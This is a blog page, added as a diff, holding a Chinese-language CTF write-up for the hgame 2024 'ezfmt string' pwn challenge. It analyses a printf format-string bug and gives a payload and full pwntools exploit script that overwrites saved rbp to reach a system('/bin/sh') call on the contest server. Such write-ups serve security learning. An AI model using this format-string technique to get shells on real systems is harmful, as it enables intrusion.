@@ -1,0 +1,321 @@
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8" />
+    <title>【2024-hgame-week1】ezfmt string | Astesia&#39;s space</title>
+    <meta name="author" content="Astesia" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ASTESIA&#39;S SPACE</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ASTESIA&#39;S SPACE</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>【2024-hgame-week1】ezfmt string</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/2/26
+        </span>
+        
+        <span class="category">
+            <a href="/categories/pwn/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                pwn
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="color: #03a9f4">格式化字符串</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>【2024 hgame week1】<strong>ezfmt string</strong> wp<br>
+<a target="_blank" rel="noopener" href="https://hgame.vidar.club/contest/1">https://hgame.vidar.club/contest/1</a></p>
+<span id="more"></span>
+<h2 id="1-代码分析"><a class="header-anchor" href="#1-代码分析">¶</a>1.代码分析</h2>
+<hr>
+<h3 id="checksec"><a class="header-anchor" href="#checksec">¶</a>checksec</h3>
+<p><img src="/2024/02/26/hgame-w1-fmtstr//image-20240226172807758.png" alt="image-20240226172807758"></p>
+<p>没开PIE和RELRO保护，故got表可写，且不需要考虑泄露地址。</p>
+<h3 id="IDA反汇编"><a class="header-anchor" href="#IDA反汇编">¶</a>IDA反汇编</h3>
+<p>运行逻辑也很简单，main函数调用vuln函数，在vuln函数中，先读入最多0x50个字节到栈中，调用strchr函数检查字符串中是否包含’p’和’s’，若不包含则直接printf。<br>
+同时,程序中存在调用system(‘/bin/sh’)的地方。<br>
+vuln函数内容如下</p>
+<pre><code class="language-C">unsigned __int64 vuln()
+&#123;
+  __int64 buf[4]; // [rsp+0h] [rbp-80h] BYREF
+  char s[88]; // [rsp+20h] [rbp-60h] BYREF
+  unsigned __int64 v3; // [rsp+78h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  strcpy((char *)buf, &quot;make strings and getshell\n&quot;);
+  write(0, buf, 0x1BuLL);
+  read(0, s, 0x50uLL);
+  if ( !strchr(s, 'p') &amp;&amp; !strchr(s, 's') )
+    printf(s);
+  return __readfsqword(0x28u) ^ v3;
+&#125;
+</code></pre>
+<p>很明显,需要构造payload进行<strong>格式化字符串漏洞</strong>的利用</p>
+<h3 id="gdb调试"><a class="header-anchor" href="#gdb调试">¶</a>gdb调试</h3>
+<p>先查看一下栈分布的情况，查找可利用的地址。</p>
+<blockquote>
+<p>read前:<br>
+<img src="/2024/02/26/hgame-w1-fmtstr//image-20240226194457383.png" alt="image-20240226194457383"></p>
+</blockquote>
+<p>可以发现，[rsp+60h]处存放着此时rbp所指向的地址，自然而然便可以通过此处<strong>修改[rbp-0h]的值</strong>，使得调用</p>
+<pre><code class="language-assembly">pop rbp
+ret
+</code></pre>
+<p>或</p>
+<pre><code class="language-assembly">leave
+ret
+</code></pre>
+<p>时执行到奇怪的位置，即<strong>改变程序执行流</strong>。</p>
+<h2 id="2-利用漏洞"><a class="header-anchor" href="#2-利用漏洞">¶</a>2.利用漏洞</h2>
+<hr>
+<p>整理一下目前拥有的情报：</p>
+<ul>
+<li>程序执行0x401241时即可system(“/bin/sh”)，且该地址可以写到栈中</li>
+<li>通过格式化字符串漏洞能够实现pop rbp到附近的位置。</li>
+</ul>
+<p>由此，思路就很明了了，构造的payload需要将0x401241写入栈中(假设为a处)，并且以1/16的概率（rsp末地址为10时）正确修改[rbp-0h]的值为a-0x8。即</p>
+<pre><code class="language-python">pld1=b&quot;%&quot;+b&quot;56&quot;+b&quot;c%18$hhn     &quot;+p64(0x401241)
+</code></pre>
+<blockquote>
+<p>read后栈分布情况如下：<br>
+<img src="/2024/02/26/hgame-w1-fmtstr//image-20240226201429244.png" alt="image-20240226201429244"><br>
+printf后栈分布情况如下：<br>
+<img src="/2024/02/26/hgame-w1-fmtstr//image-20240226202146136.png" alt="image-20240226202146136"></p>
+</blockquote>
+<p>若rsp最低位为10h即可成功ret到sys函数中（本文图例非成功情况，别问为什么没放成功情况的图，绝对不是凹不出来orz）</p>
+<h2 id="3-全部代码"><a class="header-anchor" href="#3-全部代码">¶</a>3.全部代码</h2>
+<hr>
+<pre><code class="language-python">from pwn import *
+
+context.log_level='debug'
+
+opt=1
+if opt :
+    io=remote(&quot;47.100.137.175&quot;,30008)
+else :
+    io=gdb.debug(&quot;./vuln&quot;,&quot;b vuln&quot;)
+sys_addr=0x401241
+pld1=b&quot;%&quot;+b&quot;56&quot;+b&quot;c%18$hhn     &quot;+p64(0x401241)
+io.recvuntil(b&quot;M3?\n&quot;)
+pause()
+io.send(pld1)
+#canary=io.recvuntil(b' ')
+#print(hex(int(canary.decode())))
+
+#pause()
+io.interactive()
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Astesia&#39;s space
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Astesia
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    <script src="/js/highlight.js"></script>
+    <link rel="stylesheet" href="/css/highlight/styles/github.css" />
+</body>
+</html>
